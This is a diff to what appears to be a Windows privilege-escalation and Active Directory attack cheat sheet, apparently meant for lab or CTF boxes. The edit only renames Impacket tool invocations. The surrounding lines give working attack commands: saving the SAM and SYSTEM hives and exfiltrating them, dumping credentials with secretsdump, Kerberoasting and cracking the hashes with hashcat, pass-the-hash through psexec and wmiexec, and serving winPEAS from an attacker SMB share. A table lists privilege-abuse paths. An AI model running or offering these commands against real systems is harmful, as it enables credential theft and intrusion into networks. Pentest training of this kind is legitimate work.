@@ -10,7 +10,7 @@ blocks below.
 | Privilege | Path |
 |---|---|
 | `SeImpersonatePrivilege` (service accounts, IIS) | Potato family — pick by build, below |
-| `SeBackupPrivilege` | copy SAM/SYSTEM hives → `impacket-secretsdump` offline → pass-the-hash |
+| `SeBackupPrivilege` | copy SAM/SYSTEM hives → `secretsdump.py` offline → pass-the-hash |
 | `SeRestorePrivilege` | overwrite system files as SYSTEM |
 | `SeLoadDriverPrivilege` | load a vulnerable driver (BYOVD) — box-specific |
 | `SeTakeOwnershipPrivilege` | take ownership of any file → utilman/sethc swap |
@@ -35,7 +35,7 @@ when you're unsure which works on the build.
 ```powershell
 reg save hklm\sam c:\temp\sam; reg save hklm\system c:\temp\system
 # exfil both, then on host:
-.venv/bin/impacket-secretsdump -sam sam -system system LOCAL
+.venv/bin/secretsdump.py -sam sam -system system LOCAL
 ```
 
 ## 2. Services
@@ -120,16 +120,16 @@ abuse). GUI itself: install upstream BloodHound app release, neo4j backend.
 Kerberoast (any domain user):
 
 ```bash
-.venv/bin/impacket-GetUserSPNs <domain>/<user>:<pw> -dc-ip <dc> -request
+.venv/bin/GetUserSPNs.py <domain>/<user>:<pw> -dc-ip <dc> -request
 hashcat -m 13100 spn.hash /usr/share/wordlists/rockyou.txt   # pacman wordlists or fetch
 ```
 
 Pass-the-hash / offline dump:
 
 ```bash
-.venv/bin/impacket-secretsdump <domain>/<user>:<pw>@<dc>       # or -hashes :NTLM
-.venv/bin/impacket-psexec <domain>/<user>@<target> -hashes :<NTLM>
-.venv/bin/impacket-wmiexec  <domain>/<user>@<target> -hashes :<NTLM>
+.venv/bin/secretsdump.py <domain>/<user>:<pw>@<dc>       # or -hashes :NTLM
+.venv/bin/psexec.py <domain>/<user>@<target> -hashes :<NTLM>
+.venv/bin/wmiexec.py  <domain>/<user>@<target> -hashes :<NTLM>
 ```
 
 LAPS: the local admin password lives in the `ms-Mcs-AdmPwd` attribute, readable
@@ -154,6 +154,6 @@ read it via LDAP from Linux (`ldapsearch` against the DC with
 ## 8. Automation
 
 winpeas.exe (fetch once from upstream releases into `toolbox/`, serve over
-`impacket-smbserver`/http) enumerates 1–5 in one shot. PowerShell
+`smbserver.py`/http) enumerates 1–5 in one shot. PowerShell
 `PowerUp.ps1` (`Invoke-AllChecks`) covers the service misconfigs. Verify every
 finding manually before acting on it.
